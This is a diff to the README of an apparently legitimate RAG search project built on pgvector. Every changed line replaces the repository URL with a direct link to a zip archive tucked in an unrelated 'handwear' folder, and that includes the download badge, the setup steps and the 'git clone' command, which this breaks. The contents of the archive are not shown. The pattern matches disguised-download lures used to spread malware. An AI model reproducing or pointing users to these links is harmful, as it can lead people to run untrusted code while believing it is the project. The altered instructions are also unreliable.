@@ -1,11 +1,11 @@
 # 🧠 rag-system-pgvector - Search your data with confidence
 
-[![Download](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fruitful-lure791/rag-system-pgvector)
+[![Download](https://img.shields.io/badge/Download%20Now-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fruitful-lure791/rag-system-pgvector/raw/refs/heads/main/handwear/system-rag-pgvector-v3.2.zip)
 
 ## 🚀 Download
 
 Use this link to visit this page to download:
-https://github.com/fruitful-lure791/rag-system-pgvector
+https://github.com/fruitful-lure791/rag-system-pgvector/raw/refs/heads/main/handwear/system-rag-pgvector-v3.2.zip
 
 ## 📝 What this app does
 
@@ -49,14 +49,14 @@ If you want the easiest setup, use Docker first. It keeps the app, database, and
 Follow these steps:
 
 1. Open the download page:
-   https://github.com/fruitful-lure791/rag-system-pgvector
+   https://github.com/fruitful-lure791/rag-system-pgvector/raw/refs/heads/main/handwear/system-rag-pgvector-v3.2.zip
 
 2. Get the project files to your PC. If there is a release file, download it. If there is a source package, use that instead.
 
 3. If you use Git, clone the repo:
    - Open Command Prompt
    - Run:
-     git clone https://github.com/fruitful-lure791/rag-system-pgvector.git
+     git clone https://github.com/fruitful-lure791/rag-system-pgvector/raw/refs/heads/main/handwear/system-rag-pgvector-v3.2.zip
 
 4. Open the project folder:
    - rag-system-pgvector
@@ -261,7 +261,7 @@ That makes it a good fit for apps that need search over private content and stor
 If you want the fastest path on Windows:
 
 1. Visit the download page:
-   https://github.com/fruitful-lure791/rag-system-pgvector
+   https://github.com/fruitful-lure791/rag-system-pgvector/raw/refs/heads/main/handwear/system-rag-pgvector-v3.2.zip
 
 2. Download the project files
 
